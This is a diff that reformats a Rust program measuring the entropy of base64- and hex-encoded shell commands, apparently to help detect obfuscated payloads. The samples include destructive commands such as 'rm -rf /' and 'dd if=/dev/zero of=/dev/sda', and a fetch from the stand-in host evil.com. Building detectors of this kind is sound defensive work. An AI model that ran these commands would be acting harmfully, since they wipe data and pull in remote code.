@@ -12,10 +12,16 @@ fn main() {
     measure("cm0gLXJmIC8=", "rm -rf /");
     measure("L2Jpbi9iYXNo", "/bin/bash");
     measure("U3VzcGljaW91cw==", "Suspicious");
-    measure("ZXhlYyBjdXJsIGV2aWwuY29tL3NjcmlwdC5zaA==", "exec curl evil.com/script.sh");
+    measure(
+        "ZXhlYyBjdXJsIGV2aWwuY29tL3NjcmlwdC5zaA==",
+        "exec curl evil.com/script.sh",
+    );
     measure("cm0gLXJmIH4vKg==", "rm -rf ~/*");
     measure("Y2htb2QgNzc3IC90bXA=", "chmod 777 /tmp");
-    measure("ZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvc2Rh", "dd if=/dev/zero of=/dev/sda");
+    measure(
+        "ZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvc2Rh",
+        "dd if=/dev/zero of=/dev/sda",
+    );
 
     println!("\n## Hex Encoded Commands:");
     measure("726d202d7266202f", "rm -rf / (hex)");
@@ -42,6 +48,10 @@ fn main() {
 
 fn measure(s: &str, description: &str) {
     let entropy = calculate_entropy(s);
-    println!("  {:<50} => {:.2} bits/char  (\"{}\")",
-             format!("\"{}\"", s), entropy, description);
+    println!(
+        "  {:<50} => {:.2} bits/char  (\"{}\")",
+        format!("\"{}\"", s),
+        entropy,
+        description
+    );
 }
